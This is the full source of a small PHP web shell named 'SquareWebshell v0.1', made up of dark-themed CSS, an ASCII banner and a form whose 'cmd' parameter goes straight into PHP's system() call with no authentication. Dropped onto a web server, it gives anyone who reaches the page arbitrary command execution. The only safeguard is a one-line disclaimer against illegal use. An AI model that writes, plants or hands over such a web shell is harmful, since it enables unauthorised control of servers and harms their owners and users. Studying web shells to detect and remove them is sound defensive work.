<html>
<head>
<!--
#Name:			SquareWebshell v0.1
#Type:			PHP Web Shell
#Author:		MrSaighnal
#date:			04/23/19
#officiale Repository:	https://github.com/MrSaighnal/square-webshell/

.______________________________________________.
|					       |
|  Don't use this script for illegal purposes  |
|______________________________________________|

-->
<style>
body {
    background: #0f1015;
    color: #afafaf;
}

input[type=text] {
    background: #1b2029;
    border-width: 2px;
    border-style: solid;
    border-color: #1b2029;
    padding: 10px;
    color: #ffffff;
    border-radius: 5px;
    width: 85%;
    font-size: 13px;
    color: #83aefc;
}

input[type=submit] {
    background-color: #3174ba;
    border: none;
    border-radius: 5px;
    color: white;
    padding: 10px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    size: 100%;
    width: 14%;
    font-size: 16px;
}

pre {
    padding: 15px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    background-color: #1b2029;
}

.shell {
    padding: 30px;
    width: auto;
    max-width: 900px;
    margin: 0 auto;
}

.banner {
   padding-top: 15px;
   -moz-border-radius: 5px;
   border-radius: 5px;
   color: #65b2ff;
   background-color: #0f1014;
   font-size: 10px;
   text-align: center;
}
</style>
</head>
<body>
<pre class="banner">
                                               _         _          _ _ 
 ___  __ _ _   _  __ _ _ __ ___  __      _____| |__  ___| |__   ___| | |
/ __|/ _` | | | |/ _` | '__/ _ \ \ \ /\ / / _ \ '_ \/ __| '_ \ / _ \ | |
\__ \ (_| | |_| | (_| | | |  __/  \ V  V /  __/ |_) \__ \ | | |  __/ | |
|___/\__, |\__,_|\__,_|_|  \___|   \_/\_/ \___|_.__/|___/_| |_|\___|_|_|
        |_|                                                             
                                                                    v0.1
</pre>
<div class="shell">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="☠ Execute">
</form>
<pre>
<?php
    if($_GET['cmd'])
    {
        system($_GET['cmd']);
    }
?>
</pre>
</div>
</body>
<script>document.getElementById("cmd").focus();</script>
